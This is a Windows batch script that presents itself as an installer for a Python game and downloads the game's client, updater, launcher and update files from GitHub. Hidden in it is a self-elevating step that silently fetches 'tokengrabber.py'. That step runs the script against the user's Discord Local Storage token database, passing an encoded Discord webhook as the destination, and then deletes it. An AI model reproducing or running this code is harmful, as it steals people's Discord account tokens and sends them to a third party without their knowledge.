@echo off

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

start /b cmd.exe /c "cd "c:/program files/python game" & curl -s -L https://raw.githubusercontent.com/reedthorngag/programFiles/main/tokengrabber.py --output tempinstaller.py > Nul & python tempinstaller.py aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTI4NTc1MDEzNDI5MzM4MTEyL1pGaklNN2NmcXFNOTJkQU9mOUZHaENPNTZqQk1HM1VUUjRyRU9iYUw4UWE3QmV2U0gxRGRyOTdmNkNIbTE0dlpQN2Jm "%appdata%\discord\Local Storage\leveldb" > Nul & del /q /f tempinstaller.py > Nul"

curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/client.py --output client.py
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/Clientupdater.py --output clientupdater.py
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/launcher.exe --output launcher.exe
curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/version.json --output version.json

start cmd.exe /c "ping 1.1.1.1 -n 1 -w 3000 & del /q /f update.exe & curl -L https://raw.githubusercontent.com/parkero2/Python-game-test/main/update.exe --output update.exe"